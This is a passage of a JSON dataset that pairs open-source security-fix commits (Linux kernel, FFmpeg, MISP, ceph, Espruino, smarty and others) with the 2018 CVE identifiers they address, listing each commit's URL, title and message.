<stable@vger.kernel.org> # 4.10Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2018-11232"
    ],
    "cveIdsCount": 1
  },
  "10040f6ccb58c3235ec788ef0b107d83c9b29d14a20332e85e0a92b07cc7f015": {
    "url": "https://github.com/MISP/MISP/commit/5efc07b12f82301a6086fd3433fedd69fe7119d3",
    "title": "fix: Fixed a DOM based XSS with cortex type attributes",
    "body": "- as reported by Dawid Czarnecki (dawid@pz.pl)",
    "cveIds": [
      "CVE-2018-11245"
    ],
    "cveIdsCount": 1
  },
  "1e18fe5ce9c9887b9aa9c3940ab0758d728c709741c4c57ec91e754b2b07395a": {
    "url": "https://github.com/ceph/ceph/commit/5ead97120e07054d80623dada90a5cc764c28468",
    "title": "auth/cephx: add authorizer challenge",
    "body": "Allow the accepting side of a connection to reject an initial authorizerwith a random challenge. The connecting side then has to respond with anupdated authorizer proving they are able to decrypt the service's challengeand that the new authorizer was produced for this specific connectioninstance.The accepting side requires this challenge and response unconditionallyif the client side advertises they have the feature bit. Servers wishingto require this improved level of authentication simply have to requirethe appropriate feature.Signed-off-by: Sage Weil <sage@redhat.com>(cherry picked from commit f80b848)# Conflicts:#src/auth/Auth.h#src/auth/cephx/CephxProtocol.cc#src/auth/cephx/CephxProtocol.h#src/auth/none/AuthNoneProtocol.h#src/msg/Dispatcher.h#src/msg/async/AsyncConnection.cc- const_iterator- ::decode vs decode- AsyncConnection ctor arg noise- get_random_bytes(), not cct->random()",
    "cveIds": [
      "CVE-2018-1128"
    ],
    "cveIdsCount": 1
  },
  "3a7ae83c0bc4720119be0c740796c77cfe383e5f8c47385130ff8308ecc13f0e": {
    "url": "https://github.com/ceph/ceph/commit/8f396cf35a3826044b089141667a196454c0a587",
    "title": "auth/cephx/CephxSessionHandler: implement CEPHX_V2 calculation mode",
    "body": "Derive the signature from the entire buffer (both cipher blocks).Signed-off-by: Sage Weil <sage@redhat.com>",
    "cveIds": [
      "CVE-2018-1129"
    ],
    "cveIdsCount": 1
  },
  "ceca6fcd8956b1d8aba9553048f29c162a281afed3fbd5a085cd5799dca0bab6": {
    "url": "https://github.com/AndreRenaud/PDFGen/commit/ee58aff6918b8bbc3be29b9e3089485ea46ff956",
    "title": "jpeg: Fix another possible buffer overrun",
    "body": "Found via the clang libfuzzer",
    "cveIds": [
      "CVE-2018-11363"
    ],
    "cveIdsCount": 1
  },
  "eabe6ab8199418077348f312bed2f6d18efe19eac4bc2c72dad130ae6810dc26": {
    "url": "https://github.com/radare/radare2/commit/1f37c04f2a762500222dda2459e6a04646feeedf",
    "title": "Fix #9904 - crash in r2_hoobr_r_read_le32 (over 9000 entrypoints) and…",
    "body": "… read_le oobread (#9923)",
    "cveIds": [
      "CVE-2018-11376"
    ],
    "cveIdsCount": 1
  },
  "b4419458e270579b7e1bd00eee011d5e31023cd61ea2bacda1dc33fe2e19c72b": {
    "url": "https://github.com/torvalds/linux/commit/f7068114d45ec55996b9040e98111afa56e010fe",
    "title": "sr: pass down correctly sized SCSI sense buffer",
    "body": "We're casting the CDROM layer request_sense to the SCSI sensebuffer, but the former is 64 bytes and the latter is 96 bytes.As we generally allocate these on the stack, we end up blowingup the stack.Fix this by wrapping the scsi_execute() call with a properlysized sense buffer, and copying back the bits for the CDROMlayer.Cc: stable@vger.kernel.orgReported-by: Piotr Gabriel Kosinski <pg.kosinski@gmail.com>Reported-by: Daniel Shapira <daniel@twistlock.com>Tested-by: Kees Cook <keescook@chromium.org>Fixes: 82ed4db (\"block: split scsi_request out of struct request\")Signed-off-by: Jens Axboe <axboe@kernel.dk>",
    "cveIds": [
      "CVE-2018-11506"
    ],
    "cveIdsCount": 1
  },
  "0b23483db334da9cb469401949b83ed942803e612c60292b3e6e58e8298ea891": {
    "url": "https://github.com/torvalds/linux/commit/0a0b98734479aa5b3c671d5190e86273372cab95",
    "title": "compat: fix 4-byte infoleak via uninitialized struct field",
    "body": "Commit 3a4d44b (\"ntp: Move adjtimex related compat syscalls tonative counterparts\") removed the memset() in compat_get_timex(). Sincethen, the compat adjtimex syscall can invoke do_adjtimex() with anuninitialized ->tai.If do_adjtimex() doesn't write to ->tai (e.g. because the arguments areinvalid), compat_put_timex() then copies the uninitialized ->tai fieldto userspace.Fix it by adding the memset() back.Fixes: 3a4d44b (\"ntp: Move adjtimex related compat syscalls to native counterparts\")Signed-off-by: Jann Horn <jannh@google.com>Acked-by: Kees Cook <keescook@chromium.org>Acked-by: Al Viro <viro@zeniv.linux.org.uk>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2018-11508"
    ],
    "cveIdsCount": 1
  },
  "aa10a8f90af2c815d3b4a2a9a166154abafcfba96dd10f6854670bd690719301": {
    "url": "https://github.com/MISP/MISP/commit/10080096879d1076756f62760d6daf582b6db722",
    "title": "fix: Reflected XSS via the event view",
    "body": "- users arriving on an event view via a malicious URL with a javascript payload and then clicking on the show deleted attributes tab would trigger the payload- as reported by Jarek Kozluk from zbp.pl",
    "cveIds": [
      "CVE-2018-11562"
    ],
    "cveIdsCount": 1
  },
  "844e5d70666dee9b219fd9d09dd8e3e228f1d5c33c611295d6ae256f70e7815a": {
    "url": "https://github.com/centreon/centreon/releases",
    "title": "21.04.4 … 20.10.10 … 20.04.17 …",
    "body": "adjust to PSR12 standard chore(install): update to version 20.10.10 chore(install): update version to 20.04.17",
    "cveIds": [
      "CVE-2018-11587",
      "CVE-2018-11588",
      "CVE-2018-11589"
    ],
    "cveIdsCount": 3
  },
  "8d6e01c6a14d484a53f04334afd616f537f95d0bb9f067fb31057eced855b73c": {
    "url": "https://github.com/espruino/Espruino/commit/8a44b04b584b3d3ab1cb68fed410f7ecb165e50e",
    "title": "Add height check for Graphics.createArrayBuffer(...vertical_byte:true) (",
    "body": "fix #1421)",
    "cveIds": [
      "CVE-2018-11592"
    ],
    "cveIdsCount": 1
  },
  "b238065db270ae006094c0a0637a651675206536f7ee686b34640952ab42b315": {
    "url": "https://github.com/espruino/Espruino/commit/bed844f109b6c222816740555068de2e101e8018",
    "title": "remove strncpy usage as it's effectively useless, replace with an ass…",
    "body": "…ertion since fn is only used internally (fix #1426)",
    "cveIds": [
      "CVE-2018-11593"
    ],
    "cveIdsCount": 1
  },
  "aa0d8c939c50628b9febf4fac97d2cb394474816188769bf98d15967c3265ffe": {
    "url": "https://github.com/espruino/Espruino/commit/c36d30529118aa049797db43f111ddad468aad29",
    "title": "Fix stack overflow if void void void... is repeated many times (fix #…",
    "body": "…1434)",
    "cveIds": [
      "CVE-2018-11594"
    ],
    "cveIdsCount": 1
  },
  "beaf71a8856624c1811f5ea3219ab1b66e2bced6fabfce434b155ea24ad236b0": {
    "url": "https://github.com/espruino/Espruino/commit/bf4416ab9129ee3afd56739ea4e3cd0da5484b6b",
    "title": "Fix bug if using an undefined member of an object for for..in (fix #1437",
    "body": ")",
    "cveIds": [
      "CVE-2018-11598"
    ],
    "cveIdsCount": 1
  },
  "1ef95b2fec760aa2f521311684cc6bc07f185d92253eeb16f0d9846c2ebdcd1a": {
    "url": "https://github.com/jaredhanson/oauth2orize-fprm/commit/2bf9faee787eb004abbdfb6f4cc2fb06653defd5",
    "title": "Merge pull request #4 from MarcinHoppe/fix-number-encoding",
    "body": "Correctly encoding values that are not strings",
    "cveIds": [
      "CVE-2018-11647"
    ],
    "cveIdsCount": 1
  },
  "5df388ea40108b257d34ab63bf16d43ab6a6d41dfd41607a3cad290cdd0ce339": {
    "url": "https://github.com/symphonycms/symphony-2/commit/1ace6b31867cc83267b3550686271c9c65ac3ec0",
    "title": "Fix possible self-XSS in the pages content page",
    "body": "Reported by Linkey <2542566937@qq.com>",
    "cveIds": [
      "CVE-2018-12043"
    ],
    "cveIdsCount": 1
  },
  "f07ef79690bf2e2fad557cb0243bf8a2e6d97a212edf62082759a9dd23c48dc9": {
    "url": "https://github.com/mruby/mruby/commit/55edae0226409de25e59922807cb09acb45731a2",
    "title": "Allow Object#clone to copy frozen status only; fix #4036",
    "body": "Copying all flags from the original object may overwrite the clone'sflags e.g. the embedded flag.",
    "cveIds": [
      "CVE-2018-12247"
    ],
    "cveIdsCount": 1
  },
  "b39aa6827a931777cada24e8e719abb41ee87ab997ae81b70be1d68921c99ade": {
    "url": "https://github.com/antirez/redis/commit/9fdcc15962f9ff4baebe6fdd947816f43f730d50",
    "title": "Security: fix redis-cli buffer overflow.",
    "body": "Thanks to Fakhri Zulkifli for reporting it.The fix switched to dynamic allocation, copying the final prompt in thestatic buffer only at the end.",
    "cveIds": [
      "CVE-2018-12326"
    ],
    "cveIdsCount": 1
  },
  "32bf7257d783898d2b2cac1b56201cace5e553e3efeea87bc2f11379ff2f186a": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/e1182fac1afba92a4975917823a5f644bee7e6e8",
    "title": "avcodec/mpeg4videoenc: Use 64 bit for times in mpeg4_encode_gop_header()",
    "body": "Fixes truncationFixes Assertion n <= 31 && value < (1U << n) failed at libavcodec/put_bits.h:169Fixes: ffmpeg_crash_2.aviFound-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel Böhme, Andrew Santosa and Alexandru RazvanCaciulescu with AFLSmartSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-12458"
    ],
    "cveIdsCount": 1
  },
  "f8e2e037ad0500e8e8c33d1115f47707102fce3b856612b95888310d89e4125c": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/6bbef938839adc55e8e048bc9cc2e0fafe2064df",
    "title": "avcodec/mpeg4videoenc: Use 64 bit for times in mpeg4_encode_gop_header()",
    "body": "Fixes truncationFixes Assertion n <= 31 && value < (1U << n) failed at libavcodec/put_bits.h:169Fixes: ffmpeg_crash_2.aviFound-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel Böhme, Andrew Santosa and Alexandru RazvanCaciulescu with AFLSmartSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>(cherry picked from commit e1182fa)Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-12458"
    ],
    "cveIdsCount": 1
  },
  "8196e6961013d28c6cbee37e5e5a2e2d4b64b6a28c750a7983e0f6150a9e023b": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/2fc108f60f98cd00813418a8754a46476b404a3c",
    "title": "avcodec/mpeg4videodec: Clear bits_per_raw_sample if it has originated…",
    "body": "… from a previous instanceFixes: assertion failureFixes: ffmpeg_crash_5.aviFound-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmartSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-12459"
    ],
    "cveIdsCount": 1
  },
  "dc5500028d6cec4b94baf08157fe8c13492dd43d2750b06d0bd70b61604f4309": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/b3332a182f8ba33a34542e4a0370f38b914ccf7d",
    "title": "avcodec/idctdsp: Transmit studio_profile to init instead of using AVC…",
    "body": "…odecContext profileThese 2 fields are not always the same, it is simpler to always use the same fieldfor detecting studio profileFixes: null pointer dereferenceFixes: ffmpeg_crash_3.aviFound-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel Böhme, Andrew Santosa and Alexandru RazvanCaciulescu with AFLSmartSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-12460"
    ],
    "cveIdsCount": 1
  },
  "ccbf4df534a5d0a0c64c972a3f06c8b2d2c450d5632e4c81906ba111a8aff48e": {
    "url": "https://github.com/CDrummond/cantata/commit/afc4f8315d3e96574925fb530a7004cc9e6ce3d3",
    "title": "Remove internal Samba shre mounting code, this had some privilege esc…",
    "body": "…alation issues, and is not well tested",
    "cveIds": [
      "CVE-2018-12559",
      "CVE-2018-12561",
      "CVE-2018-12562"
    ],
    "cveIdsCount": 3
  },
  "163064dcaa2c083d006551ef64f86a0671ec267a3b8980a5831f0402084d9990": {
    "url": "https://github.com/resiprocate/resiprocate/commit/2cb291191c93c7c4e371e22cb89805a5b31d6608",
    "title": "-fixed an issue where the stack could crash if a TCP based sender sen…",
    "body": "…ds a Content-Length that is less that the actual SIP body transmitted in order to trigger this condition the SIP message body must arrive in a separate read request, either from the start or part way through the body and there must be data following the body in the same read.",
    "cveIds": [
      "CVE-2018-12584"
    ],
    "cveIdsCount": 1
  },
  "a5de8b110afccfb435abeac54901563c57e394fab1724ba533fca4044f8a6ce2": {
    "url": "https://github.com/GNOME/gimp/commit/c21eff4b031acb04fb4dfce8bd5fdfecc2b6524f",
    "title": "Issue #1689: create unique temporary file with g_file_open_tmp().",
    "body": "Not sure this is really solving the issue reported, which is that`g_get_tmp_dir()` uses environment variables (yet as g_file_open_tmp()uses g_get_tmp_dir()…). But at least g_file_open_tmp() should createunique temporary files, which prevents overriding existing files (whichis most likely the only real attack possible here, or at least the onlyone I can think of unless some weird vulnerabilities exist in glib).",
    "cveIds": [
      "CVE-2018-12713"
    ],
    "cveIdsCount": 1
  },
  "eff74ea9c5afe53f9b462df1fa79102fec530bcedf272f1e42ad08df517af7d5": {
    "url": "https://github.com/torvalds/linux/commit/81f9c4e4177d31ced6f52a89bb70e93bfb77ca03",
    "title": "Merge tag 'trace-v4.18-rc1' of git://git.kernel.org/pub/scm/linux/ker…",
    "body": "…nel/git/rostedt/linux-tracePull tracing fixes from Steven Rostedt: \"This contains a few fixes and a clean up. - a bad merge caused an \"endif\" to go in the wrong place in scripts/Makefile.build - softirq tracing fix for tracing that corrupts lockdep and causes a false splat - histogram documentation typo fixes - fix a bad memory reference when passing in no filter to the filter code - simplify code by using the swap macro instead of open coding the swap\"* tag 'trace-v4.18-rc1' of git://git.kernel.org/pub/scm/linux/kernel/git/rostedt/linux-trace: tracing: Fix SKIP_STACK_VALIDATION=1 build due to bad merge with -mrecord-mcount tracing: Fix some errors in histogram documentation tracing: Use swap macro in update_max_tr softirq: Reorder trace_softirqs_on to prevent lockdep splat tracing: Check for no filter when processing event filters",
    "cveIds": [
      "CVE-2018-12714"
    ],
    "cveIdsCount": 1
  },
  "c142048d547acdd35b38384d0fbe433d6ddc37d8176e6f48f923aa778e7ff829": {
    "url": "https://github.com/torvalds/linux/commit/78c9c4dfbf8c04883941445a195276bb4bb92c76",
    "title": "posix-timers: Sanitize overrun handling",
    "body": "The posix timer overrun handling is broken because the forwarding functionscan return a huge number of overruns which does not fit in an int. As aconsequence timer_getoverrun(2) and siginfo::si_overrun can turn intorandom number generators.The k_clock::timer_forward() callbacks return a 64 bit value now. Makek_itimer::ti_overrun[_last] 64bit as well, so the kernel internalaccounting is correct. 3Remove the temporary (int) casts.Add a helper function which clamps the overrun value returned to user spacevia timer_getoverrun(2) or siginfo::si_overrun limited to a positive valuebetween 0 and INT_MAX. INT_MAX is an indicator for user space that theoverrun value has been clamped.Reported-by: Team OWL337 <icytxw@gmail.com>Signed-off-by: Thomas Gleixner <tglx@linutronix.de>Acked-by: John Stultz <john.stultz@linaro.org>Cc: Peter Zijlstra <peterz@infradead.org>Cc: Michael Kerrisk <mtk.manpages@gmail.com>Link: https://lkml.kernel.org/r/20180626132705.018623573@linutronix.de",
    "cveIds": [
      "CVE-2018-12896"
    ],
    "cveIdsCount": 1
  },
  "865928a66afea026fa855f7174b75de76fceb131d2d2ddf88546cb162c6dfc64": {
    "url": "https://github.com/golang/gddo/commit/daffe1f90ec57f8ed69464f9094753fc6452e983",
    "title": "gosrc: validate repo from meta",
    "body": "Fixes CVE-2018-12976.Change-Id: I6b87ab692915d46ba4f668ab848473de9b054c8aReviewed-on: https://go-review.googlesource.com/121358Reviewed-by: Filippo Valsorda <filippo@golang.org>",
    "cveIds": [
      "CVE-2018-12976"
    ],
    "cveIdsCount": 1
  },
  "51daa2cf9bfb151aac2c1ba4ec56b420abe8cb7ab1c4fa62d622906544c8606e": {
    "url": "https://github.com/torvalds/linux/commit/afca6c5b2595fc44383919fba740c194b0b76aff",
    "title": "xfs: validate cached inodes are free when allocated",
    "body": "A recent fuzzed filesystem image cached random dcache corruptionwhen the reproducer was run. This often showed up as panics inlookup_slow() on a null inode->i_ops pointer when doing pathwalks.BUG: unable to handle kernel NULL pointer dereference at 0000000000000000....Call Trace: lookup_slow+0x44/0x60 walk_component+0x3dd/0x9f0 link_path_walk+0x4a7/0x830 path_lookupat+0xc1/0x470 filename_lookup+0x129/0x270 user_path_at_empty+0x36/0x40 path_listxattr+0x98/0x110 SyS_listxattr+0x13/0x20 do_syscall_64+0xf5/0x280 entry_SYSCALL_64_after_hwframe+0x42/0xb7but had many different failure modes including deadlocks trying tolock the inode that was just allocated or KASAN reports ofuse-after-free violations.The cause of the problem was a corrupt INOBT on a v4 fs where theroot inode was marked as free in the inobt record. Hence when weallocated an inode, it chose the root inode to allocate, found it inthe cache and re-initialised it.We recently fixed a similar inode allocation issue caused by inobtrecord corruption problem in xfs_iget_cache_miss() in commitee45700 (\"xfs: catch inode allocation state mismatchcorruption\"). This change adds similar checks to the cache-hit pathto catch it, and turns the reproducer into a corruption shutdownsituation.Reported-by: Wen Xu <wen.xu@gatech.edu>Signed-Off-By: Dave Chinner <dchinner@redhat.com>Reviewed-by: Christoph Hellwig <hch@lst.de>Reviewed-by: Carlos Maiolino <cmaiolino@redhat.com>Reviewed-by: Darrick J. Wong <darrick.wong@oracle.com>[darrick: fix typos in comment]Signed-off-by: Darrick J. Wong <darrick.wong@oracle.com>",
    "cveIds": [
      "CVE-2018-13093"
    ],
    "cveIdsCount": 1
  },
  "d736451ba09b1275df74b0b5079120346ae70bdfbf60de7f9c46b17575890a39": {
    "url": "https://github.com/torvalds/linux/commit/bb3d48dcf86a97dc25fe9fc2c11938e19cb4399a",
    "title": "xfs: don't call xfs_da_shrink_inode with NULL bp",
    "body": "xfs_attr3_leaf_create may have errored out before instantiating a buffer,for example if the blkno is out of range. In that case there is no workto do to remove it, and in fact xfs_da_shrink_inode will lead to an oopsif we try.This also seems to fix a flaw where the original error fromxfs_attr3_leaf_create gets overwritten in the cleanup case, and itremoves a pointless assignment to bp which isn't used after this.Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=199969Reported-by: Xu, Wen <wen.xu@gatech.edu>Tested-by: Xu, Wen <wen.xu@gatech.edu>Signed-off-by: Eric Sandeen <sandeen@redhat.com>Reviewed-by: Darrick J. Wong <darrick.wong@oracle.com>Signed-off-by: Darrick J. Wong <darrick.wong@oracle.com>",
    "cveIds": [
      "CVE-2018-13094"
    ],
    "cveIdsCount": 1
  },
  "57f7e6c79a13e058f4e36748db66493b7c746931ef5c77521f347bdd44d6e897": {
    "url": "https://github.com/torvalds/linux/commit/23fcb3340d033d9f081e21e6c12c2db7eaa541d3",
    "title": "xfs: More robust inode extent count validation",
    "body": "When the inode is in extent format, it can't have more extents thatfit in the inode fork. We don't currenty check this, and so thiscorruption goes unnoticed by the inode verifiers. This can lead tocrashes operating on invalid in-memory structures.Attempts to access such a inode will now error out in the verifierrather than allowing modification operations to proceed.Reported-by: Wen Xu <wen.xu@gatech.edu>Signed-off-by: Dave Chinner <dchinner@redhat.com>Reviewed-by: Darrick J. Wong <darrick.wong@oracle.com>[darrick: fix a typedef, add some braces and breaks to shut up compiler warnings]Signed-off-by: Darrick J. Wong <darrick.wong@oracle.com>",
    "cveIds": [
      "CVE-2018-13095"
    ],
    "cveIdsCount": 1
  },
  "f1a6e4f95487a723de04df2503925dc85fbcebe92941485d22ec46e6cb5cd94c": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/95556e27e2c1d56d9e18f5db34d6f756f3011148",
    "title": "avformat/movenc: Do not pass AVCodecParameters in avpriv_request_sample",
    "body": "Fixes: out of array readFixes: ffmpeg_crash_8.aviFound-by: Thuan Pham, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmartSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-13300"
    ],
    "cveIdsCount": 1
  },
  "aeb867d0e8a4228af30e7cf8d4934ac353bd017fb849a2438e7669d9d7dc7a93": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/e6d3fd942f772f54ab6a5ca619cdaadef26b7702",
    "title": "avformat/movenc: Do not pass AVCodecParameters in avpriv_request_sample",
    "body": "Fixes: out of array readFixes: ffmpeg_crash_8.aviFound-by: Thuan Pham, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmartSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>(cherry picked from commit 95556e2)Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-13300"
    ],
    "cveIdsCount": 1
  },
  "8cc2ff9bd7b95e9aadfb7050da6ab13775290e4fe4f026ec223517717adb6d3f": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/2aa9047486dbff12d9e040f917e5f799ed2fd78b",
    "title": "avcodec/mpeg4videodec: Check read profile before setting it",
    "body": "Fixes: null pointer dereferenceFixes: ffmpeg_crash_7.aviFound-by: Thuan Pham, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmartSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-13301"
    ],
    "cveIdsCount": 1
  },
  "f315c74642d038032f5c9a48d20d1eb81ebe083cdfce094be945ca35f0a05d40": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/00e8181bd97c834fe60751b0c511d4bb97875f78",
    "title": "avcodec/ac3_parser: Check init_get_bits8() for failure",
    "body": "Fixes: null pointer dereferenceFixes: ffmpeg_crash_6.aviFound-by: Thuan Pham, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmartReviewed-by: Paul B Mahol <onemda@gmail.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-13303"
    ],
    "cveIdsCount": 1
  },
  "55591de73c17c85ea19bc21d0f67a996b8ecd3d1e67c00cc860d2de576b3a1f9": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/d08d4a8c7387e758d439b0592782e4cfa2b4d6a4",
    "title": "avcodec/vc1_block: Fix mqaunt check for negative values",
    "body": "Fixes: out of array accessFixes: ffmpeg_bof_4.aviFixes: ffmpeg_bof_5.aviFixes: ffmpeg_bof_6.aviFound-by: Thuan Pham, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmartReviewed-by: Jerome Borsboom <jerome.borsboom@carpalis.nl>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-13305"
    ],
    "cveIdsCount": 1
  },
  "0d1ebed98f726fbbcfb586be495d6187e3cc445d679e8da84eb6433f0e7e92fe": {
    "url": "https://github.com/torvalds/linux/commit/0fa3ecd87848c9c93c2c828ef4c3a8ca36ce46c7",
    "title": "Fix up non-directory creation in SGID directories",
    "body": "sgid directories have special semantics, making newly created files inthe directory belong to the group of the directory, and newly createdsubdirectories will also become sgid. This is historically used forgroup-shared directories.But group directories writable by non-group members should not implythat such non-group members can magically join the group, so make sureto clear the sgid bit on non-directories for non-members (but rememberthat sgid without group execute means \"mandatory locking\", just toconfuse things even more).Reported-by: Jann Horn <jannh@google.com>Cc: Andy Lutomirski <luto@kernel.org>Cc: Al Viro <viro@zeniv.linux.org.uk>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2018-13405"
    ],
    "cveIdsCount": 1
  },
  "a18723ba96a99b4978e70b8900ce2dbb4ac24bdba75ff81a36f00aa0ddd472fb": {
    "url": "https://github.com/torvalds/linux/commit/9f645bcc566a1e9f921bdae7528a01ced5bc3713",
    "title": "video: uvesafb: Fix integer overflow in allocation",
    "body": "cmap->len can get close to INT_MAX/2, allowing for an integer overflow inallocation. This uses kmalloc_array() instead to catch the condition.Reported-by: Dr Silvio Cesare of InfoSect <silvio.cesare@gmail.com>Fixes: 8bdb3a2 (\"uvesafb: the driver core\")Cc: stable@vger.kernel.orgSigned-off-by: Kees Cook <keescook@chromium.org>",
    "cveIds": [
      "CVE-2018-13406"
    ],
    "cveIdsCount": 1
  },
  "a5aa829730faba8da0001facb2e921cfaefcda4023b0ba21778155994b821488": {
    "url": "https://github.com/glennrp/libpng/commit/8a05766cb74af05c04c53e6c9d60c13fc4d59bf2",
    "title": "[libpng16] Fix the calculation of row_factor in png_check_chunk_length",
    "body": "(Bug report by Thuan Pham, SourceForge issue #278)",
    "cveIds": [
      "CVE-2018-13785"
    ],
    "cveIdsCount": 1
  },
  "36a99577f9b1e7637068034e4098fe96a3829e2119ca6dbfd619caf134be0db3": {
    "url": "https://github.com/scravy/node-macaddress/commit/358fd594adb196a86b94ac9c691f69fe5dad2332",
    "title": "Merge pull request #20 from flypapertech/fixCommandInjection",
    "body": "Fixes arbitrary command injection by using execFile instead of exec",
    "cveIds": [
      "CVE-2018-13797"
    ],
    "cveIdsCount": 1
  },
  "ed1af2b6efb6d2402b54eabee210374707d7f1223a08f5b6ec8a8a39f9416771": {
    "url": "https://github.com/smarty-php/smarty/commit/f9ca3c63d1250bb56b2bda609dcc9dd81f0065f8",
    "title": "- bugfix regarding Security Vulnerability did not solve the problem u…",
    "body": "…nder Linux",
    "cveIds": [
      "CVE-2018-13982"
    ],
    "cveIdsCount": 1
  },
  "4c67771321be0e9c7623167576205e2e18b541474420bc4b949c5bb0453c6884": {
    "url": "https://github.com/smarty-php/smarty/commit/c9dbe1d08c081912d02bd851d1d1b6388f6133d1",
    "title": "- bugfix regarding Security Vulnerability did not solve the problem u…",
    "body": "…nder Linux",
    "cveIds": [
      "CVE-2018-13982"
    ],
    "cveIdsCount": 1
  },
  "79460a2846e30dfb0fc686d91cb8baa54e48458c0ef00068face1f749dbaa34c": {
    "url": "https://github.com/smarty-php/smarty/commit/2e081a51b1effddb23f87952959139ac62654d50",
    "title": "- bugfix regarding Security Vulnerability did not solve the problem u…",
    "body": "…nder Linux",
    "cveIds": [
      "CVE-2018-13982"
    ],
    "cveIdsCount": 1
  },
  "3c5611992bc7caae521a8908ff06613a944e8e00fea74ad0e5b7f310dfdb4765": {
    "url": "https://github.com/radareorg/radare2/commit/d37d2b858ac47f2f108034be0bcecadaddfbc8b3",
    "title": "Fix #10465 - Avoid string on low addresses (workaround) for corrupted…",
    "body": "… dwarf (#10478)",
    "cveIds": [
      "CVE-2018-14015"
    ],
    "cveIdsCount": 1
  },
  "15839935ef33d67684c3db1b3b0c0c3770b18e59377f7f9a0c4c7d8310f34a71": {
    "url": "http://github.com/mantisbt/mantisbt/commit/8b5fa243dbf04344a55fe880135ec149fc1f439f",
    "title": "Fix XSS on filter edit page (CVE-2018-14504)",
    "body": "Teun Beijers reported a cross-site scripting (XSS) vulnerability inthe Edit Filter page which allows execution of arbitrary code(if CSP settings permit it) when displaying a filter with a craftedname.Prevent the attack by sanitizing the filter name before display.Fixes #24608",
    "cveIds": [
      "CVE-2018-14504"
    ],
    "cveIdsCount": 1
  },
  "33f2c70545b3683326fc60e29dc3c0ca03cda52ffcfedf9e5aff6b12ff098421": {
    "url": "https://github.com/kyz/libmspack/commit/72e70a921f0f07fee748aec2274b30784e1d312a",
    "title": "Fix off-by-one bounds check on CHM PMGI/PMGL chunk numbers and",
    "body": "reject empty filenames. Thanks to Hanno Böck for reporting",
    "cveIds": [
      "CVE-2018-14680"
    ],
    "cveIdsCount": 1
  },
  "87b890b595929e7b1af44d4419d5f7e71d937c11f608f3dab164d22732c4703c": {
    "url": "https://github.com/nystudio107/craft-seomatic/commit/1e7d1d084ac3a89e7ec70620f2749110508d1ce1",
    "title": "Changed the way requests that don't match any elements generate the `…",
    "body": "…canonicalUrl`, to avoid potentially executing injected Twig codeSigned-off-by: Andrew Welch <andrew@nystudio107.com>",
    "cveIds": [
      "CVE-2018-14716"
    ],
    "cveIdsCount": 1
  },
  "54468323b9a22a71b8353e91de3d408cab92d2d207bcf4fde0cb83d6385719c4": {
    "url": "https://github.com/torvalds/linux/commit/cb2595c1393b4a5211534e6f0a0fbad369e21ad8",
    "title": "infiniband: fix a possible use-after-free bug",
    "body": "ucma_process_join() will free the new allocated \"mc\" struct,if there is any error after that, especially the copy_to_user().But in parallel, ucma_leave_multicast() could find this \"mc\"through idr_find() before ucma_process_join() frees it, since itis already published.So \"mc\" could be used in ucma_leave_multicast() after it is beenallocated and freed in ucma_process_join(), since we don't refcntit.Fix this by separating \"publish\" from ID allocation, so that wecan get an ID first and publish it later after copy_to_user().Fixes: c8f6a36 (\"RDMA/cma: Add multicast communication support\")Reported-by: Noam Rathaus <noamr@beyondsecurity.com>Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com>Signed-off-by: Jason Gunthorpe <jgg@mellanox.com>",
    "cveIds": [
      "CVE-2018-14734"
    ],
    "cveIdsCount": 1
  },
  "11af86d6425277c17a85d4082b58ba04c1a34b3fe80ce4a3ae48fb90c7150996": {
    "url": "https://github.com/symfony/symfony/commit/725dee4cd8b4ccd52e335ae4b4522242cea9bd4a",
    "title": "[HttpKernel] fix trusted headers management in HttpCache and InlineFr…",
    "body": "…agmentRenderer",
    "cveIds": [
      "CVE-2018-14774"
    ],
    "cveIdsCount": 1
  },
  "4718eafec6e49fde47b3c8dfa3c105b04b0b1bc2ac8666df33cb78c8e82870d8": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/e01c9bf76740802025c9328901b55ee4a0c49ed6",
    "title": "(for 4.9.3) CVE-2018-14880/OSPFv3: Fix a bounds check",
